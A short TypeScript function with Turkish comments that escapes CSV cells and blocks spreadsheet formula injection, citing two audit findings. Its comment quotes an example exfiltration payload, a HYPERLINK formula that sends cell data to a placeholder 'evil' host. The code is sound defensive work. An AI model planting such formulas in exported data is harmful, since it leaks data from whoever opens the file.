/**
 * CSV alanını güvenli yaz: RFC-4180 kaçışı + FORMÜL ENJEKSİYONU koruması.
 *
 * NEDEN (2026-08 denetimi #17): alanlar kullanıcı-kontrollü (ad, ünvan, adres, e-posta).
 * `=`, `+`, `-`, `@` veya TAB/CR ile başlayan bir hücreyi Excel/Sheets FORMÜL olarak
 * çalıştırır — ör. adını `=HYPERLINK("http://evil/?"&A1,"fatura")` yapan biri, CSV'yi açan
 * ADMIN'in makinesinde veri sızdırabilir. Önüne tek tırnak koymak hücreyi metne sabitler.
 *
 * 2026-09 (#28): baştaki BOŞLUKLAR (Excel yok sayıp formülü yine çalıştırabilir) ve TAM
 * GENİŞLİKLİ `＝＋－＠` (bazı sürümler ASCII'ye normalize eder) da kapsanır.
 */
export function csvCell(v: string | null | undefined): string {
  let s = v ?? "";
  if (/^[\s\u3000]*[=+\-@\t\r\uFF1D\uFF0B\uFF0D\uFF20]/.test(s)) s = `'${s}`;
  return /[";\n\r]/.test(s) ? `"${s.replace(/"/g, '""')}"` : s;
}
